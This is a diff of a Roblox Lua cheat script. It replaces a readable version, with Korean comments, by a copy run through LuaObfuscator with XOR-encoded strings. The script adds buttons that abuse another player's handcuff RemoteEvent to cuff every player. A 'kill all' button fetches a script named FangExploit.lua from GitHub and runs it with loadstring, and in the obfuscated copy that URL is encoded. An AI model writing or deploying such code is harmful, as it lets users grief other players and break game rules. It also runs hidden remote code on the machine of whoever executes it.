@@ -1,91 +1,12 @@
-local ScreenGui = Instance.new("ScreenGui")
-local TopButton = Instance.new("TextButton")
-local BottomButton = Instance.new("TextButton")
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
 
-ScreenGui.Parent = game:GetService("CoreGui")
+]]--
 
--- 버튼 기본 설정
-local function setupButton(button, text, posY)
-    button.Parent = ScreenGui
-    button.Size = UDim2.new(0, 200, 0, 50)
-    button.Position = UDim2.new(0, 20, 0.5, posY)
-    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-    button.TextColor3 = Color3.fromRGB(0, 0, 0)
-    button.Font = Enum.Font.SourceSansBold
-    button.TextSize = 18
-    button.Text = text
-end
-
-setupButton(TopButton, "모두 묶기", -60)
-setupButton(BottomButton, "킬올", 10)
-
--- 서비스 참조
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-
--- 수갑을 소유한 플레이어 찾기
-local function findPlayerWithCuffs()
-	for _, player in ipairs(Players:GetPlayers()) do
-		local backpack = player:FindFirstChild("Backpack")
-		if backpack and backpack:FindFirstChild("수갑") then
-			return player
-		end
-	end
-	return nil
-end
-
--- 모든 플레이어를 수갑으로 묶기
-local function cuffAllPlayers()
-	local playerWithCuffs = findPlayerWithCuffs()
-	if playerWithCuffs then
-		local backpack = playerWithCuffs:FindFirstChild("Backpack")
-		local cuffs = backpack and backpack:FindFirstChild("수갑")
-
-		if cuffs and cuffs:FindFirstChild("RemoteEvent") then
-			local remoteEvent = cuffs.RemoteEvent
-
-			for _, targetPlayer in ipairs(Players:GetPlayers()) do
-				if targetPlayer ~= playerWithCuffs and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and localPlayer ~= targetPlayer then
-					local args = {
-						[1] = "Cuff",
-						[2] = targetPlayer.Character.Head
-					}
-
-					local success, err = pcall(function()
-						remoteEvent:FireServer(unpack(args))
-					end)
-
-					if not success then
-						warn("Error firing RemoteEvent for:", targetPlayer.Name, err)
-					end
-
-					wait(0.1) -- 서버 요청 처리 지연
-				end
-			end
-		else
-			print("Player with cuffs does not have the RemoteEvent.")
-		end
-	else
-		print("No player with handcuffs found.")
-	end
-end
-
--- 메시지 출력 함수
-local function showMessage(msg)
-    print(msg)
-end
-
--- 위 버튼 기능: ALL Cuff 실행
-TopButton.MouseButton1Click:Connect(function()
-    showMessage("ALL Cuff")
-    cuffAllPlayers()
-end)
-
--- 아래 버튼 기능: FangExploit 실행
-BottomButton.MouseButton1Click:Connect(function()
-    getgenv().exclude_me = true -- 본인 제외 여부
-    getgenv().kill = true -- 죽일지 여부
-    getgenv().fire = true -- 불을 붙일지 여부
-    local func = ({pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/xsinew/scripts/refs/heads/main/FangExploit.lua"))})[2]
-    pcall(func, func)
-end)
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v18,v19) local v20={};for v33=1, #v18 do v6(v20,v0(v4(v1(v2(v18,v33,v33 + 1 )),v1(v2(v19,1 + (v33% #v19) ,1 + (v33% #v19) + 1 )))%256 ));end return v5(v20);end local v8=Instance.new(v7("\226\192\201\32\227\181\224\11\216","\126\177\163\187\69\134\219\167"));local v9=Instance.new(v7("\23\200\50\209\222\54\217\62\202\242","\156\67\173\74\165"));local v10=Instance.new(v7("\0\178\81\2\158\51\82\32\184\71","\38\84\215\41\118\220\70"));v8.Parent=game:GetService(v7("\115\25\48\23\217\69\31","\158\48\118\66\114"));local function v12(v21,v22,v23) local v24=0 + 0 ;local v25;while true do if (v24==(1680 -(550 + 1130))) then v25=0 + 0 ;while true do if ((2 -1)==v25) then v21.Position=UDim2.new(1265 -(243 + 1022) ,76 -56 ,0.5,v23);v21.BackgroundColor3=Color3.fromRGB(255,0 + 0 ,0 + 0 );v25=1 + 1 ;end if (v25==(3 + 0)) then v21.TextSize=903 -(261 + 624) ;v21.Text=v22;break;end if (v25==(0 -0)) then v21.Parent=v8;v21.Size=UDim2.new(1080 -(1020 + 60) ,1623 -(630 + 793) ,0 -0 ,76 -26 );v25=4 -3 ;end if ((1 + 1)==v25) then v21.TextColor3=Color3.fromRGB(0 -0 ,0 -0 ,1747 -(760 + 987) );v21.Font=Enum.Font.SourceSansBold;v25=1916 -(1789 + 124) ;end end break;end end end v12(v9,"모두 묶기", -60);v12(v10,"킬올",776 -(745 + 21) );local v13=game:GetService(v7("\155\40\17\47\118\183\232","\155\203\68\112\86\19\197"));local v14=v13.LocalPlayer;local function v15() local v26=0 + 0 ;while true do if (0==v26) then for v41,v42 in ipairs(v13:GetPlayers()) do local v43=v42:FindFirstChild(v7("\100\220\53\247\80\121\230\243","\152\38\189\86\156\32\24\133"));if (v43 and v43:FindFirstChild("수갑")) then return v42;end end return nil;end end end local function v16() local v27=v15();if v27 then local v34=0 -0 ;local v35;local v36;while true do if (v34==(0 -0)) then local v44=0 + 0 ;while true do if (v44==0) then v35=v27:FindFirstChild(v7("\222\86\164\77\236\86\164\77","\38\156\55\199"));v36=v35 and v35:FindFirstChild("수갑") ;v44=1 + 0 ;end if (v44==(439 -(262 + 176))) then v34=1056 -(87 + 968) ;break;end end end if (v34==(1722 -(345 + 1376))) then if (v36 and v36:FindFirstChild(v7("\154\120\113\39\7\113\223\85\173\115\104","\35\200\29\28\72\115\20\154"))) then local v54=688 -(198 + 490) ;local v55;while true do if (v54==(0 -0)) then v55=v36.RemoteEvent;for v57,v58 in ipairs(v13:GetPlayers()) do if ((v58~=v27) and v58.Character and v58.Character:FindFirstChild(v7("\49\186\208\219","\84\121\223\177\191\237\76")) and (v14~=v58)) then local v59={[2 -1 ]=v7("\152\67\207\166","\161\219\54\169\192\90\48\80"),[2 + 0 ]=v58.Character.Head};local v60,v61=pcall(function() v55:FireServer(unpack(v59));end);if  not v60 then warn(v7("\108\80\18\42\91\2\6\44\91\75\14\34\9\112\5\40\70\86\5\0\95\71\14\49\9\68\15\55\19","\69\41\34\96"),v58.Name,v61);end wait(0.1 -0 );end end break;end end else print(v7("\140\207\214\19\7\57\252\212\222\30\10\107\191\214\209\12\17\107\184\204\210\25\66\37\179\215\151\2\3\61\185\131\195\2\7\107\142\198\218\5\22\46\153\213\210\4\22\101","\75\220\163\183\106\98"));end break;end end else print(v7("\44\181\203\39\213\3\163\142\37\153\21\179\159\63\153\10\187\133\51\218\23\188\141\36\153\4\181\158\57\221\76","\185\98\218\235\87"));end end local function v17(v28) print(v28);end v9.MouseButton1Click:Connect(function() local v29=0 -0 ;local v30;while true do if (v29==(1262 -(1091 + 171))) then v30=0 + 0 ;while true do if (v30==(0 -0)) then v17(v7("\234\16\11\166\253\191\205\58","\202\171\92\71\134\190"));v16();break;end end break;end end end);v10.MouseButton1Click:Connect(function() local v31=1413 -(447 + 966) ;local v32;while true do if (v31==(2 -1)) then getgenv().fire=true;v32=({pcall(loadstring,game:HttpGet(v7("\33\213\56\152\58\155\99\199\59\192\59\198\46\200\56\128\60\195\57\155\44\211\47\135\39\213\41\134\61\143\47\135\36\142\52\155\32\207\41\159\102\210\47\154\32\209\56\155\102\211\41\142\58\142\36\141\40\197\63\199\36\192\37\134\102\231\45\134\46\228\52\152\37\206\37\156\103\205\57\137","\232\73\161\76")))})[703 -(376 + 325) ];v31=2 -0 ;end if (v31==(5 -3)) then pcall(v32,v32);break;end if (v31==(0 + 0)) then getgenv().exclude_me=true;getgenv().kill=true;v31=1;end end end);
